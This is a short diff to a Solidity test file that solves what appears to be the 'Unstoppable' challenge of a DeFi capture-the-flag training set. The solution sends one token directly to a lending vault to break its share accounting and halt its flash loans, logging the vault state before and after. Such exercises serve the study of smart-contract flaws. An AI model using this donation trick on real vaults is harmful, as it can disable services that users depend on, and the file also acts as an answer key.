@@ -91,7 +91,13 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        console.log("totalAssets ", vault.totalAssets());
+        console.log("totalSupply ", vault.totalSupply());
+        console.log("convertToShares ", vault.convertToShares(vault.totalSupply()));
+        token.transfer(address(vault), 1);
+        console.log("totalAssets after transfer", vault.totalAssets());
+        console.log("totalSupply after transfer", vault.totalSupply());
+        console.log("convertToShares after transfer", vault.convertToShares(vault.totalSupply()));
     }
 
     /**
